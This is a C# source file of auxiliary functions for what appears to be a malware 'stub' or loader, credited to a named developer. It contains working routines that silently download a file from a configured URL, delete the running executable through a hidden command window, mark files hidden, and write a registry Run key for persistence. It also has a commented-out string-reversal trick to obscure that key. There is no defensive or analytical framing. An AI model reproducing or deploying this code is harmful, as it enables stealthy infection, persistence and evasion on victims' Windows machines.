// Auxiliary-Functions file
// Coded by k3rnel-dev(@k666_dev) - Telegram | github.com/k3rnel-dev
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace Stub.Modules.InternalFuncs
{
    internal class InternalAux
    {
        public static string ReadRegistryValue(string keyName, string valueName)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName))
            {
                if (key != null)
                {
                    var value = key.GetValue(valueName);
                    if (value != null)
                    {
                        return value.ToString();
                    }
                }
            }
            return null;
        }

        public static void WriteRegistryValue(string keyName, string valueName, string data)
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyName))
            {
                if (key != null)
                {
                    key.SetValue(valueName, data);
                }
            }
        }

        public static void DownloadFile()
        {

            if (File.Exists(config.FileLocation))
            {
                File.Delete(config.FileLocation);
            }
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(config.Url, config.FileLocation);
                }
            }
            catch { }
        }

        public static void SelfRemove()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t 1 && DEL /f {currentProcessFileName} ";
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }


        /*        public static string StringReverse(string input)
                {
                    char[] charArray = input.ToCharArray();
                    Array.Reverse(charArray);
                    return new string(charArray);
                }
        */

        public static void HideFile(string fileLocation)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", $"/c attrib +h \"{fileLocation}\"")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = false,
                    RedirectStandardError = false
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit();
                }
            } catch { } // Заглушка

        }

        public static void AddToAutoRun(string appName, string appPath)
        {
            try
            {
                /**string keyName = StringReverse(@"nuR\noisreVtnerruC\tfosorciM\swodniW\erawtfoS"); */

                string keyName = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

                // Проверяем, существует ли уже такой ключ в реестре
                string existingValue = InternalAux.ReadRegistryValue(keyName, appName);
                if (existingValue == null)
                {
                    InternalAux.WriteRegistryValue(keyName, appName, appPath);
                }
            } catch { }
        }
    }
}
